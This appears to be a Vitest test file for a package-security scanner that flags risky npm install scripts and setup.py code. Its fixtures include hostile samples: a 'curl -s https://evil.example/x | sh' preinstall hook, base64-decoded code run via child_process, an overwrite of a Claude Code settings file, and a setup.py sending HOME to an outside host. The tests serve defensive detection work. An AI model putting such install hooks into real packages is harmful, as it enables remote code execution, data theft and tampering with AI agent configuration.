import { describe, expect, it } from "vitest";
import { makeTgz } from "../test/helpers.js";
import { analyzeNpmTarball, analyzeSetupPy, referencedFiles } from "./scripts.js";
import { readTarGz } from "./tar.js";

const canary = `const fs=require("fs");const http=require("http");
const n=Object.keys(process.env).length;fs.writeFileSync("/tmp/x",String(n));
http.get({host:"127.0.0.1",port:4874});`;

describe("tar", () => {
  it("reads files from an in-memory tgz", () => {
    const files = readTarGz(makeTgz({ "package/a.js": "1", "package/b.txt": "2" }), () => true);
    expect(files.map((f) => f.path)).toEqual(["package/a.js", "package/b.txt"]);
  });
});

describe("npm install-script analysis", () => {
  it("finds referenced files", () => {
    expect(referencedFiles("node scripts/postinstall.js && sh ./x.sh")).toEqual(["scripts/postinstall.js", "x.sh"]);
    expect(referencedFiles("node setup")).toEqual(["setup"]);
  });

  it("flags the canary's env + network", () => {
    const f = analyzeNpmTarball({ postinstall: "node scripts/postinstall.js" }, makeTgz({ "package/package.json": "{}", "package/scripts/postinstall.js": canary }));
    expect(f.files).toEqual(["scripts/postinstall.js"]);
    expect(f.network.join()).toContain("loads a network module");
    expect(f.env.join()).toContain("dumps the whole environment");
    expect(f.obfuscation).toEqual([]);
  });

  it("follows relative requires to depth 2 and spots dynamic child_process + agent config", () => {
    const f = analyzeNpmTarball(
      { install: "node install.js" },
      makeTgz({
        "package/install.js": "require('./lib/run')",
        "package/lib/run.js": "const cp=require('child_process');const c=Buffer.from(x,'base64').toString();cp.exec(c);require('fs').writeFileSync(require('os').homedir()+'/.claude/settings.json','{}')",
      }),
    );
    expect(f.files).toEqual(["install.js", "lib/run.js"]);
    expect(f.obfuscation.join()).toContain("runs child_process with a computed command");
    expect(f.obfuscation.join()).toContain("decodes base64");
    expect(f.agentConfig.join()).toContain("Claude Code");
  });

  it("detects curl in the script command itself and binding.gyp command expansion", () => {
    const f = analyzeNpmTarball({ preinstall: "curl -s https://evil.example/x | sh" }, makeTgz({ "package/binding.gyp": "{'targets':[{'target_name':'<!(node -e \"require(\\'./a\\')\")'}]}" }));
    expect(f.network.join()).toContain("curl");
    expect(f.hasBindingGyp).toBe(true);
    expect(f.obfuscation.join()).toContain("binding.gyp runs shell commands");
  });

  it("benign build script is quiet", () => {
    const f = analyzeNpmTarball({ postinstall: "node scripts/check.js" }, makeTgz({ "package/scripts/check.js": "if (process.env.NODE_ENV !== 'production') console.log('thanks for installing')" }));
    expect([...f.network, ...f.env, ...f.obfuscation, ...f.agentConfig]).toEqual([]);
  });
});

describe("setup.py", () => {
  it("flags network + exec", () => {
    const f = analyzeSetupPy("import os, urllib.request\nfrom setuptools import setup\nurllib.request.urlopen('http://x.example/a?'+os.environ['HOME'])\nsetup(name='x')");
    expect(f.network.length).toBeGreaterThan(0);
    expect(f.env.length).toBeGreaterThan(0);
  });
  it("plain setup is quiet", () => {
    const f = analyzeSetupPy("from setuptools import setup\nsetup(name='x', version='1.0')");
    expect([...f.network, ...f.env, ...f.obfuscation]).toEqual([]);
    expect(f.runsCode).toBe(false);
  });
});
